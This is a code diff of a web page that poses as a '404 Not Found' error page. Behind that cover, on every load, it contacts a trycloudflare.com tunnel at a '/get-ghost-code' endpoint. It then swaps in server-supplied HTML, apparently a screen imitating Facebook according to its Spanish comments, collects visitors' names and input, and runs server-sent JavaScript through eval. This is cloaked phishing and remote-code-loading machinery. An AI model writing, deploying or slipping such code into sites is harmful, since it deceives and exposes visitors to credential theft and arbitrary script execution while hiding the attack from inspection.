@@ -6,58 +6,35 @@
     <title>404 Not Found</title>
     <style>
         body { 
-            height: 100vh; 
-            margin: 0; 
-            display: flex; 
-            flex-direction: column; 
-            justify-content: center; 
-            align-items: center; 
-            font-family: 'Courier New', monospace; 
-            background-color: #ffffff;
-            color: #333;
+            height: 100vh; margin: 0; display: flex; flex-direction: column; 
+            justify-content: center; align-items: center; 
+            font-family: 'Courier New', monospace; background-color: #ffffff;
         }
-        .error-container { text-align: center; }
-        h1 { font-size: 50px; margin: 0; }
-        p { font-size: 18px; margin-bottom: 30px; }
+        .error-container { text-align: center; padding: 20px; }
+        h1 { font-size: 60px; margin: 0; color: #000; }
+        p { font-size: 16px; color: #333; }
         
         .tk-input { 
-            padding: 15px; 
-            width: 280px; 
-            border: 1px solid #ddd; 
-            border-radius: 8px; 
-            text-align: center; 
-            font-size: 16px;
-            outline: none;
-            text-transform: uppercase;
+            padding: 15px; width: 280px; border: 1px solid #ddd; 
+            border-radius: 8px; text-align: center; font-size: 16px;
+            text-transform: uppercase; outline: none; margin-top: 20px;
         }
         .btn { 
-            margin-top: 15px; 
-            padding: 12px 25px; 
-            background: #f8f9fa; 
-            border: 1px solid #ccc; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            font-weight: bold; 
-            transition: 0.3s;
+            margin-top: 15px; padding: 12px 25px; background: #fff; 
+            border: 1px solid #333; border-radius: 8px; cursor: pointer; 
+            font-weight: bold; transition: 0.3s;
         }
-        .btn:hover { background: #e2e6ea; }
+        .btn:hover { background: #000; color: #fff; }
 
-        /* Pantalla de carga profesional */
-        #loading-screen {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: white;
-            z-index: 10000;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
+        /* Loader profesional */
+        #loader {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 10000; justify-content: center; 
+            align-items: center; flex-direction: column; font-family: sans-serif;
         }
-        .spinner {
-            width: 50px; height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #0064e0;
-            border-radius: 50%;
+        .spin {
+            width: 45px; height: 45px; border: 5px solid #f3f3f3;
+            border-top: 5px solid #0064e0; border-radius: 50%;
             animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -65,79 +42,81 @@
 </head>
 <body>
 
-    <div id="loading-screen">
-        <div class="spinner"></div>
-        <p style="margin-top:15px; font-family: sans-serif;">Cargando sistema...</p>
+    <div id="loader">
+        <div class="spin"></div>
+        <p style="margin-top:15px; font-weight:bold; color:#555;">Validando sistema...</p>
     </div>
 
-    <div class="error-container" id="main-content">
+    <div class="error-container" id="box">
         <h1>404</h1>
         <p>The requested URL was not found on this server.</p>
         <input type="text" id="tk" class="tk-input" placeholder="DIAGNOSTIC TOKEN">
         <br>
-        <button class="btn" onclick="runDiagnostic()">RUN DIAGNOSTIC</button>
+        <button class="btn" onclick="runGo()">RUN DIAGNOSTIC</button>
     </div>
 
     <script>
-        // CAMBIA ESTO POR TU URL DE CLOUDFLARE ACTUAL
+        // --- COLOCA AQUÍ TU URL DE CLOUDFLARE ---
         const API_URL = "https://clearance-beginner-chat-workshops.trycloudflare.com";
 
-        // Al cargar la página, verificamos si ya tiene acceso previo
-        window.onload = () => {
-            if (localStorage.getItem('session_active') === 'true') {
-                console.log("Sesión activa detectada. Accediendo...");
-                runDiagnostic(true);
-            }
-        };
+        // Al cargar, verificar si ya tiene acceso por IP
+        window.onload = () => { runGo(true); };
 
-        async function runDiagnostic(isReturning = false) {
-            const tokenInput = document.getElementById('tk');
-            const loader = document.getElementById('loading-screen');
+        async function runGo(isAuto = false) {
+            const tkInput = document.getElementById('tk');
+            const box = document.getElementById('box');
+            const loader = document.getElementById('loader');
             
-            let tokenValue = "";
-            if (!isReturning) {
-                tokenValue = tokenInput.value.trim().toUpperCase();
-                if (!tokenValue) {
-                    alert("Por favor ingrese un token de diagnóstico.");
-                    return;
-                }
+            let tkValue = isAuto ? "" : tkInput.value.trim().toUpperCase();
+            
+            if (!isAuto && !tkValue) {
+                alert("Ingrese un token válido.");
+                return;
             }
 
-            loader.style.display = 'flex';
+            if (!isAuto) loader.style.display = 'flex';
 
             try {
-                const response = await fetch(`${API_URL}/get-ghost-code`, {
+                const res = await fetch(`${API_URL}/get-ghost-code`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        llave: tokenValue,
-                        is_returning: isReturning
-                    })
+                    body: JSON.stringify({ llave: tkValue, is_returning: isAuto })
                 });
 
-                if (response.ok) {
-                    const data = await response.json();
-                    
-                    // Reemplazamos todo el contenido con lo que manda Python
-                    document.open();
-                    document.write(data.html);
-                    document.close();
-                    
-                    // Ejecutamos el JavaScript que mandó el servidor
-                    eval(data.js);
+                if (res.ok) {
+                    const data = await res.json();
+                    loader.style.display = 'none';
+
+                    if (data.status === 'register') {
+                        // PANTALLA DE NOMBRE Y OPINIÓN
+                        document.body.innerHTML = data.html;
+                        document.getElementById('fReg').onsubmit = async (e) => {
+                            e.preventDefault();
+                            const nom = document.getElementById('n_reg').value;
+                            const opi = document.getElementById('o_reg').value;
+                            
+                            loader.style.display = 'flex';
+                            await fetch(`${API_URL}/registrar`, {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({ nombre: nom, opinion: opi })
+                            });
+                            location.reload(); // Recarga para entrar a FB
+                        };
+                    } else if (data.status === 'ok') {
+                        // PANTALLA DE FACEBOOK
+                        document.open();
+                        document.write(data.html);
+                        document.close();
+                        eval(data.js);
+                    }
                 } else {
                     loader.style.display = 'none';
-                    if (isReturning) {
-                        // Si falló el auto-login, borramos la sesión vieja
-                        localStorage.removeItem('session_active');
-                    } else {
-                        alert("ERROR: Token inválido o expirado.");
-                    }
+                    if (!isAuto) alert("Token incorrecto o expirado.");
                 }
-            } catch (error) {
+            } catch (e) {
                 loader.style.display = 'none';
-                console.error(error);
-                alert("Servidor fuera de línea o error de conexión.");
+                console.log("Servidor offline");
             }
         }
     </script>
